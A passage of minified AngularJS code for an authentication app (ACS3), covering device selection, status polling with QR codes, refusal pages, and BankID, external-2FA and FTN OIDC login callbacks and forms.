POLL="poll";$scope.lastChance=!1,$scope.step=ThisService.data[$rootScope.uniqueId].currentMeansStep,$scope.deviceSelectValues=[],$scope.selectForm={validateDisabled:!0,choiceDisabled:!1},$scope.userChoiceAllowed=ThisService.data[$rootScope.uniqueId].userChoiceAllowed&&ThisService.data[$rootScope.uniqueId].displayUserChoice,$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network,$state.params.backup&&!DeviceSelect.hasSelectedDevice()&&MessageBanner.display($scope.network,$scope.means,"POLLING_PAGE",MessageBanner.BACKUP_TRIGGERED),DeviceSelect.subscribe($scope,function(){$scope.selectForm.validateDisabled=!DeviceSelect.hasSelectedDevice(),ValButton.setDisable(!DeviceSelect.hasSelectedDevice())}),SwitchMeansButton.setDisplay($scope.userChoiceAllowed),SwitchMeansButton.setDisable(!$scope.userChoiceAllowed),$scope.validateDevice=function(){ThisService.data[$rootScope.uniqueId].currentMeansStep="select_validating",CnButton.setDisable(!0),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.OTP_SENDING);var selectDeviceUpdateAuthent={},language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){selectDeviceUpdateAuthent.language=language,selectDeviceUpdateAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,selectDeviceUpdateAuthent.step="select_validating",selectDeviceUpdateAuthent.hubAuthenticationInput={},selectDeviceUpdateAuthent.hubAuthenticationInput.chosenDeviceId=DeviceSelect.selectedDeviceId,$scope.selectForm.validateDisabled=!0,$scope.selectForm.choiceDisabled=!0,AuthentPagesService.updateAuthentication(selectDeviceUpdateAuthent).then(function(hubResponse){$timeout(function(){MessageBanner.hideMessage(),hubResponse.hubAuthenticationOutput.externalTechnicalErrorBackupAllowed?(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.ERROR),$scope.useBackup()):(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS),ThisService.data[$rootScope.uniqueId].chosenDeviceId=DeviceSelect.selectedDeviceId,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=DeviceSelect.selectedDevice,updateMenusAndLabel($scope.step=POLL))},2500)})})};var displayPollingBanner=function(){MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENTICATION_IN_PROGRESS)};MessageBanner.subscribeCloseButtonClicked($scope,function(){displayPollingBanner()}),SwitchMeansButton.subscribeClicked($scope,function(){$scope.polling.cancel()});var endAuthentication=function(){var endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},AuthentPagesService.endAuthentication(endAuthentication).then(function(){ThisService.readyExit()})};$scope.pollLastChance=function(intervalinfo){if(1==intervalinfo.sleepMode){if(_.isNil($rootScope.uniqueId)||_.isNil(ThisService.data[$rootScope.uniqueId]))return $scope.polling.next(),!1;if(!(ThisService.data[$rootScope.uniqueId].timeout-ThisService.data[$rootScope.uniqueId].timerValue<=5e3&&0==$scope.lastChance))return $scope.polling.next(),!1;$scope.lastChance=!0}return!0},$scope.poll=function(intervalinfo){if(0!=$scope.pollLastChance(intervalinfo)){var startPollingAuthent={};startPollingAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,startPollingAuthent.hubAuthenticationInput={},startPollingAuthent.hubAuthenticationInput.authenticationId=ThisService.data[$rootScope.uniqueId].hubAuthentId,startPollingAuthent.hubAuthenticationInput.transactionId=ThisService.data[$rootScope.uniqueId].hubSessionId,ThisService.data[$rootScope.uniqueId].currentMeansStep===POLL&&AuthentPagesService.startPolling(startPollingAuthent).then(function(hubResponse){hubResponse.anotherAuthentNeeded?(ThisService.data[$rootScope.uniqueId].currentMeansStep="end",$scope.polling.cancel(),UserExperienceService.track(UserActionType.POLLING_ACTION,ReactionLevel.SUCCESS),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS,MessageLevel.SUCCESS,DisplayType.CLOSABLE),CnButton.setDisable(!0),$timeout(function(){SplashScreen.splash(SplashMode.ENTER_MESSAGE),$state.go(APP_STATES.HOME,{combine:!0})},2500)):hubResponse.authentTerminated?function(hubResponse){ThisService.data[$rootScope.uniqueId].currentMeansStep="end",$scope.polling.cancel(),ThisService.prepareExit(),hubResponse.hubAuthenticationOutput.authenticationSuccess?(UserExperienceService.track(UserActionType.POLLING_ACTION,ReactionLevel.SUCCESS),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS),CnButton.setDisable(!0),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)):hubResponse.hubAuthenticationOutput.authenticationCanceled?(MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TRANSACTION_CANCELLED),CnButton.setDisable(!0),ThisService.killSession(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)):hubResponse.hubAuthenticationOutput.authenticationBlocked?(MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_FAILURE),CnButton.setDisable(!0),ThisService.killSession(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)):(hubResponse.hubAuthenticationOutput.authenticationFailed?ThisService.killSession():UserExperienceService.track(UserActionType.POLLING_ACTION,ReactionLevel.ERROR),$state.go(APP_STATES.FAILURE)),endAuthentication()}(hubResponse):hubResponse.hubAuthenticationOutput.externalWsUnavailable?(UserExperienceService.track(UserActionType.POLLING_ACTION,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),CnButton.setDisable(!0),ThisService.killSession(),ThisService.readyExit(),$timeout(function(){$state.go(APP_STATES.EXIT)},5e3)):hubResponse.hubAuthenticationOutput.externalTechnicalErrorBackupAllowed?(UserExperienceService.track(UserActionType.POLLING_ACTION,ReactionLevel.ERROR),$scope.polling.cancel(),$scope.useBackup()):(_.isEqual($scope.means,"QR_CODE")&&(hasPendingStatus(hubResponse,STATUS_PENDING.PENDING_1)?(MessageBanner.hideMessage(),ExternalImageService.setImageBase64Value(hubResponse.hubAuthenticationOutput.encodedQRCodeImageUrl),ExternalImageService.setDisplayed(!0)):hasPendingStatus(hubResponse,STATUS_PENDING.PENDING_2)&&(ExternalImageService.setDisplayed(!1),displayPollingBanner())),$scope.polling.next())},function(){$scope.polling.cancel(),endAuthentication()})}};var hasPendingStatus=function(hubResponse,pending){return!_.isEmpty(hubResponse.hubAuthenticationOutput.freeContextMap.STATUS_PENDING)&&_.isEqual(hubResponse.hubAuthenticationOutput.freeContextMap.STATUS_PENDING,pending)};if($scope.step)updateMenusAndLabel($scope.step);else{var newAuthent={};newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={};var language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){newAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(newAuthent.region=LOCALES.availableLocales[language].region),newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){hubResponse.meansToUse&&hubResponse.meansToUseState!==POLL?(ThisService.data[$rootScope.uniqueId].externalWSResponse=hubResponse.hubAuthenticationOutput.externalWSResponse,$state.go(hubResponse.meansToUseState)):hubResponse.hubAuthenticationOutput.externalTechnicalErrorBackupAllowed?$scope.useBackup():(_.isEmpty(hubResponse.hubAuthenticationOutput.challenges)?ExternalLinkService.setDisplayed(!1):(ExternalLinkService.setUrl(hubResponse.hubAuthenticationOutput.challenges[0]),ExternalLinkService.setDisplayed(!0)),!function(hubResponse){return hubResponse.hubAuthenticationOutput.deviceMap&&0!==hubResponse.hubAuthenticationOutput.deviceMap.length}(hubResponse)?updateMenusAndLabel($scope.step=POLL):(ThisService.data[$rootScope.uniqueId].deviceMap=hubResponse.hubAuthenticationOutput.deviceMap,!function(hubResponse){return hubResponse.hubAuthenticationOutput.chosenDeviceId&&0!==hubResponse.hubAuthenticationOutput.chosenDeviceId.length&&hubResponse.hubAuthenticationOutput.chosenDeviceValue&&0!==hubResponse.hubAuthenticationOutput.chosenDeviceValue.length}(hubResponse)?updateMenusAndLabel($scope.step="select"):(ThisService.data[$rootScope.uniqueId].chosenDeviceId=hubResponse.hubAuthenticationOutput.chosenDeviceId,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=hubResponse.hubAuthenticationOutput.chosenDeviceValue,updateMenusAndLabel($scope.step=POLL)))),ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id})})}function updateMenusAndLabel(step){if(ThisService.data[$rootScope.uniqueId].currentMeansStep=step,SplashScreen.hide(),"select"===step){for(var id in ValButton.setAction($scope.validateDevice),ThisService.data[$rootScope.uniqueId].pageType="CHOICE_PAGE",CustomItems.switchPageType(ThisService.data[$rootScope.uniqueId].pageType),$scope.layoutData=CustomItems.getCustomPageLayout(),Hamburger.updateCustomTextKey($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType),SwitchMeansButton.setSwitchMeansButtonInfo(void 0,$scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,SwitchMeansButton.MISSING_DEVICE),CnButton.setDisable(!1),DeviceSelect.hasSelectedDevice()&&(DeviceSelect.clearDevice(),SideMenu.removeDeviceItem()),ThisService.data[$rootScope.uniqueId].deviceMap)$scope.deviceSelectValues.push({id:id,value:ThisService.data[$rootScope.uniqueId].deviceMap[id]});DeviceSelect.setDevices($scope.deviceSelectValues)}else if("select_validating"===step){for(var id in $scope.step="select",ThisService.data[$rootScope.uniqueId].deviceMap)$scope.deviceSelectValues.push({id:id,value:ThisService.data[$rootScope.uniqueId].deviceMap[id]});DeviceSelect.setDevices($scope.deviceSelectValues),$scope.validateDevice()}else step===POLL?($scope.polling=IntervalByBrowserActivity.get($scope.poll,5e3,{customInterval:!0,waitVisibilityLost:!0,waitFocusLost:!1,keepCallbackCallInterval:!0,sleepDelay:2500,debugmode:!1}),ThisService.data[$rootScope.uniqueId].pageType="POLLING_PAGE",CustomItems.switchPageType(ThisService.data[$rootScope.uniqueId].pageType),$scope.layoutData=CustomItems.getCustomPageLayout(),Hamburger.updateCustomTextKey($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType),SwitchMeansButton.setSwitchMeansButtonInfo(void 0,$scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,SwitchMeansButton.SWITCH_MEANS_LABEL),ThisService.data[$rootScope.uniqueId].chosenDeviceId&&(DeviceSelect.updateDevice({id:ThisService.data[$rootScope.uniqueId].chosenDeviceId,value:ThisService.data[$rootScope.uniqueId].chosenDeviceValue}),SideMenu.removeDeviceItem(),SideMenu.addMenuItem({label:SideMenu.SELECTED_DEVICE_MENU_LABEL,value:DeviceSelect.selectedDevice,data:{means:$scope.means,network:$scope.network},type:MenuItemType.DEVICE})),CnButton.setDisable(!1),displayPollingBanner()):"end"===step&&(ThisService.readyExit(),$state.go(APP_STATES.EXIT))}ThisService.onDeath($scope,function(){$scope.selectForm.validateDisabled=!0,$scope.selectForm.choiceDisabled=!0,DeviceSelect.setDisabled(!0),SwitchMeansButton.setDisable(!0),ValButton.setDisable(!0),angular.isDefined($scope.polling)&&($scope.polling.cancel(),$scope.polling=void 0)}),$scope.useBackup=function(){$state.go(APP_STATES.HOME,{backup:!0})}}]),ACS3.component("refusal",{templateUrl:"app/components/RefusalModule/refusal.html",controller:"RefusalCtrl"}),ACS3.controller("RefusalCtrl",["$scope","$rootScope","$stateParams","$state","$timeout","ThisService","CnButton","SwitchMeansButton","CustomItems","SplashScreen","MessageBanner","APP_STATES","$translate",function($scope,$rootScope,$stateParams,$state,$timeout,ThisService,CnButton,SwitchMeansButton,CustomItems,SplashScreen,MessageBanner,APP_STATES,$translate){$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network,ThisService.data[$rootScope.uniqueId].pageType="REFUSAL_PAGE",CustomItems.switchPageType(ThisService.data[$rootScope.uniqueId].pageType),$scope.userChoiceAllowed=ThisService.data[$rootScope.uniqueId].userChoiceAllowed&&ThisService.data[$rootScope.uniqueId].displayUserChoice,SwitchMeansButton.setDisplay($scope.userChoiceAllowed),SwitchMeansButton.setDisable(!$scope.userChoiceAllowed),$scope.layoutData=CustomItems.getCustomPageLayout(),SplashScreen.hide();var language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){"INFO"!=$scope.means?(CnButton.setDisable(!0),$stateParams.backup?MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.BACKUP_REFUSAL):MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_REFUSAL),$timeout(function(){ThisService.readyExit(),$state.go(APP_STATES.EXIT)},1e4)):SwitchMeansButton.setSwitchMeansButtonInfo(void 0,$scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,SwitchMeansButton.SWITCH_MEANS_LABEL)})}]),ACS3.component("void",{templateUrl:"app/components/VoidModule/void.html",controller:"VoidCtrl"}),ACS3.controller("VoidCtrl",["$scope","$state","UserExperienceService","MessageBanner","APP_STATES",function($scope,$state,UserExperienceService,MessageBanner,APP_STATES){$scope.returnButtonAction=function(){UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.SUCCESS),MessageBanner.returnButtonAction(),$state.go(APP_STATES.EXIT)}}]);var ACS_COMMONS=angular.module("ACS3");ACS3.directive("bankIdCallback",function(){return{restrict:"E",controller:"BankIdCallbackCtrl"}}),ACS3.controller("BankIdCallbackCtrl",["$scope","$rootScope","ThisService","UserExperienceService","$state","AuthentPagesService","MessageBanner","$timeout","CnButton","$http","$q","$translate","APP_STATES",function($scope,$rootScope,ThisService,UserExperienceService,$state,AuthentPagesService,MessageBanner,$timeout,CnButton,$http,$q,$translate,APP_STATES){$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;var str,callbackResponse={success:$state.params.success?(str=$state.params.success,decodeURIComponent(Array.prototype.map.call(atob(str),function(c){return"%"+("00"+c.charCodeAt(0).toString(16)).slice(-2)}).join(""))):void 0,error:$state.params.error,cancelled:$state.params.cancelled},endAuthentication=function(){var authentInput,endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},authentInput=endAuthentication,$http.post("authent/bankid/endAuthent",authentInput,{"Content-Type":"application/json; charset=UTF-8"}).then(function(response){return response.data},function(response){return response.data}).then(function(){ThisService.killSession(),ThisService.readyExit(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)})},language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){if(callbackResponse.success){UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS);var updateAuthentInput={accountId:ThisService.data[$rootScope.uniqueId].accountId,hubAuthenticationInput:{chosenMeans:"BANKID",otp:callbackResponse.success}};AuthentPagesService.updateAuthentication(updateAuthentInput).then(function(hubResponse){hubResponse.hubAuthenticationOutput.authenticationSuccess?MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS):(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_REFUSAL)),endAuthentication()})}else callbackResponse.cancelled?CnButton.action():(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),endAuthentication())})}]),(ACS3=angular.module("ACS3")).directive("bankIdForm",function(){return{restrict:"E",templateUrl:"app/directives/BankIdForm/bankIdForm.html",controller:"BankIdFormCtrl"}}),ACS3.factory("BankId",["$rootScope","ThisService","LOCALES","AuthentPagesService","$translate",function($rootScope,ThisService,LOCALES,AuthentPagesService,$translate){return{load:function(){var newAuthent={};newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={};var language=$translate.proposedLanguage()||$translate.use();return newAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(newAuthent.region=LOCALES.availableLocales[language].region),newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){ThisService.data.callbackId=$rootScope.uniqueId,ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id,ThisService.data[$rootScope.uniqueId].authRequestData=hubResponse.hubAuthenticationOutput.authRequestData,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=hubResponse.hubAuthenticationOutput.chosenDeviceValue})}}}]),ACS3.controller("BankIdFormCtrl",["$scope","$rootScope","ValButton","$sce","ThisService","BankId","SplashScreen","MessageBanner","$unloadEvent","$translate",function($scope,$rootScope,ValButton,$sce,ThisService,BankId,SplashScreen,MessageBanner,$unloadEvent,$translate){$scope.bankIdForm={},$scope.bankIdAction={};var bankIdData=ThisService.data[$rootScope.uniqueId].authRequestData,bankIdAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue;$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;function enableBankIdForm(){ValButton.setDisable(!1),$scope.bankIdAction=$sce.trustAsResourceUrl(bankIdAction),$scope.bankIdMethod="GET",bankIdData=JSON.parse(bankIdData),$scope.bankIdForm.client_id=bankIdData.client_id,$scope.bankIdForm.scope=bankIdData.scope,$scope.bankIdForm.redirect_uri=$sce.trustAsResourceUrl(bankIdData.redirect_uri),$scope.bankIdForm.response_type=bankIdData.response_type,$scope.bankIdForm.response_mode=bankIdData.response_mode,$scope.bankIdForm.nonce=bankIdData.nonce,$scope.bankIdForm.state=bankIdData.state,$scope.bankIdForm.prompt=bankIdData.prompt,$scope.bankIdForm.login_hint=bankIdData.login_hint,$scope.bankIdForm.ui_locales=bankIdData.ui_locales,$scope.bankIdForm.acr_values=bankIdData.acr_values,SplashScreen.hide()}ValButton.setDisable(!0),_.isEmpty(bankIdData)?BankId.load().then(function(){bankIdData=ThisService.data[$rootScope.uniqueId].authRequestData,bankIdAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue,enableBankIdForm()}):enableBankIdForm(),ValButton.setAction(function(){ThisService.data[$rootScope.uniqueId].callbackLang=$translate.proposedLanguage()||$translate.use(),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENTICATION_IN_PROGRESS),$unloadEvent.disable(),document.getElementById("formBankId").submit()})}]);ACS_COMMONS=angular.module("ACS3");ACS3.directive("ext2faCallback",function(){return{restrict:"E",controller:"Ext2FaCallbackCtrl"}}),ACS3.controller("Ext2FaCallbackCtrl",["$scope","$rootScope","ThisService","UserExperienceService","$state","AuthentPagesService","MessageBanner","$timeout","CnButton","$http","$q","$translate","APP_STATES",function($scope,$rootScope,ThisService,UserExperienceService,$state,AuthentPagesService,MessageBanner,$timeout,CnButton,$http,$q,$translate,APP_STATES){$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;var str,callbackResponse={success:$state.params.success?(str=$state.params.success,decodeURIComponent(Array.prototype.map.call(atob(str),function(c){return"%"+("00"+c.charCodeAt(0).toString(16)).slice(-2)}).join(""))):void 0,error:$state.params.error,cancelled:$state.params.cancelled},endAuthentication=function(){var authentInput,endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},authentInput=endAuthentication,$http.post("authent/ext2fa/endAuthent",authentInput,{"Content-Type":"application/json; charset=UTF-8"}).then(function(response){return response.data},function(response){return response.data}).then(function(){ThisService.killSession(),ThisService.readyExit(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)})},language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){if(callbackResponse.success){UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS);var updateAuthentInput={accountId:ThisService.data[$rootScope.uniqueId].accountId,hubAuthenticationInput:{chosenMeans:"EXT2FA",otp:callbackResponse.success}};AuthentPagesService.updateAuthentication(updateAuthentInput).then(function(hubResponse){hubResponse.hubAuthenticationOutput.authenticationSuccess?MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS):(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_REFUSAL)),endAuthentication()})}else callbackResponse.cancelled?CnButton.action():(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),endAuthentication())})}]),(ACS3=angular.module("ACS3")).directive("ext2faForm",function(){return{restrict:"E",templateUrl:"app/directives/Ext2FaForm/ext2faForm.html",controller:"Ext2FaFormCtrl"}}),ACS3.factory("Ext2Fa",["$rootScope","ThisService","LOCALES","AuthentPagesService","$translate",function($rootScope,ThisService,LOCALES,AuthentPagesService,$translate){return{load:function(){var newAuthent={};newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={};var language=$translate.proposedLanguage()||$translate.use();return newAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(newAuthent.region=LOCALES.availableLocales[language].region),newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){ThisService.data.callbackId=$rootScope.uniqueId,ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id,ThisService.data[$rootScope.uniqueId].authRequestData=hubResponse.hubAuthenticationOutput.authRequestData,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=hubResponse.hubAuthenticationOutput.chosenDeviceValue})}}}]),ACS3.controller("Ext2FaFormCtrl",["$scope","$rootScope","ValButton","$sce","ThisService","Ext2Fa","SplashScreen","MessageBanner","$unloadEvent","$translate",function($scope,$rootScope,ValButton,$sce,ThisService,Ext2Fa,SplashScreen,MessageBanner,$unloadEvent,$translate){$scope.ext2faForm={},$scope.ext2faAction={};var ext2faData=ThisService.data[$rootScope.uniqueId].authRequestData,ext2faAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue;$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;function enableExt2FaForm(){ValButton.setDisable(!1),$scope.ext2faAction=$sce.trustAsResourceUrl(ext2faAction),$scope.ext2faMethod="GET",ext2faData=JSON.parse(ext2faData),$scope.ext2faForm.client_id=ext2faData.client_id,$scope.ext2faForm.scope=ext2faData.scope,$scope.ext2faForm.redirect_uri=$sce.trustAsResourceUrl(ext2faData.redirect_uri),$scope.ext2faForm.response_type=ext2faData.response_type,$scope.ext2faForm.response_mode=ext2faData.response_mode,$scope.ext2faForm.nonce=ext2faData.nonce,$scope.ext2faForm.state=ext2faData.state,$scope.ext2faForm.prompt=ext2faData.prompt,$scope.ext2faForm.login_hint=ext2faData.login_hint,$scope.ext2faForm.ui_locales=ext2faData.ui_locales,$scope.ext2faForm.acr_values=ext2faData.acr_values;var authDataToParse=ext2faData.action_ids;if(authDataToParse){var params=ext2faData.action_ids.split("&");if(1<params.length){var keyValuePair=params[0].split("=");1<keyValuePair.length&&($scope.ext2faForm.action_ids=keyValuePair[1]),1<(keyValuePair=params[1].split("=")).length&&($scope.ext2faForm.allowedSecuritySystems=keyValuePair[1])}else console.error("Couldn't parse action_ids and allowedSecurtySystems from auth data value : "+authDataToParse)}SplashScreen.hide()}ValButton.setDisable(!0),_.isEmpty(ext2faData)?Ext2Fa.load().then(function(){ext2faData=ThisService.data[$rootScope.uniqueId].authRequestData,ext2faAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue,enableExt2FaForm()}):enableExt2FaForm(),ValButton.setAction(function(){ThisService.data[$rootScope.uniqueId].callbackLang=$translate.proposedLanguage()||$translate.use(),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENTICATION_IN_PROGRESS),$unloadEvent.disable(),document.getElementById("formExt2Fa").submit()})}]);ACS_COMMONS=angular.module("ACS3");ACS3.directive("ftnCallback",function(){return{restrict:"E",controller:"FtnCallbackCtrl"}}),ACS3.controller("FtnCallbackCtrl",["$scope","$rootScope","ThisService","UserExperienceService","$state","AuthentPagesService","MessageBanner","$timeout","CnButton","$http","$q","$translate","APP_STATES",function($scope,$rootScope,ThisService,UserExperienceService,$state,AuthentPagesService,MessageBanner,$timeout,CnButton,$http,$q,$translate,APP_STATES){$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;var str,callbackResponse={success:$state.params.success?(str=$state.params.success,decodeURIComponent(Array.prototype.map.call(atob(str),function(c){return"%"+("00"+c.charCodeAt(0).toString(16)).slice(-2)}).join(""))):void 0,error:$state.params.error,cancelled:$state.params.cancelled},endAuthentication=function(){var authentInput,endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},authentInput=endAuthentication,$http.post("authent/ftn/endAuthent",authentInput,{"Content-Type":"application/json; charset=UTF-8"}).then(function(response){return response.data},function(response){return response.data}).then(function(){ThisService.killSession(),ThisService.readyExit(),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)})},language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){if(callbackResponse.success){UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS);var updateAuthentInput={accountId:ThisService.data[$rootScope.uniqueId].accountId,hubAuthenticationInput:{chosenMeans:"FTN_OIDC",otp:callbackResponse.success}};AuthentPagesService.updateAuthentication(updateAuthentInput).then(function(hubResponse){hubResponse.hubAuthenticationOutput.authenticationSuccess?MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS):(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_REFUSAL)),endAuthentication()})}else callbackResponse.cancelled?CnButton.action():(UserExperienceService.track(UserActionType.TECHNICAL_ERROR,ReactionLevel.ERROR),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),endAuthentication())})}]),(ACS3=angular.module("ACS3")).directive("ftnForm",function(){return{restrict:"E",templateUrl:"app/directives/FtnForm/ftnForm.html",controller:"FtnFormCtrl"}}),ACS3.factory("Ftn",["$rootScope","ThisService","LOCALES","AuthentPagesService","$translate",function($rootScope,ThisService,LOCALES,AuthentPagesService,$translate){return{load:function(){var newAuthent={};newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={};var language=$translate.proposedLanguage()||$translate.use();return newAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(newAuthent.region=LOCALES.availableLocales[language].region),newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){ThisService.data.callbackId=$rootScope.uniqueId,ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id,ThisService.data[$rootScope.uniqueId].authRequestData=hubResponse.hubAuthenticationOutput.authRequestData,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=hubResponse.hubAuthenticationOutput.chosenDeviceValue})}}}]),ACS3.controller("FtnFormCtrl",["$scope","$rootScope","ValButton","$sce","ThisService","Ftn","SplashScreen","MessageBanner","$unloadEvent","$translate",function($scope,$rootScope,ValButton,$sce,ThisService,Ftn,SplashScreen,MessageBanner,$unloadEvent,$translate){$scope.ftnForm={},$scope.ftnAction={};var ftnData=ThisService.data[$rootScope.uniqueId].authRequestData,ftnAction=ThisService.data[$rootScope.uniqueId].chosenDeviceValue;$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network;function 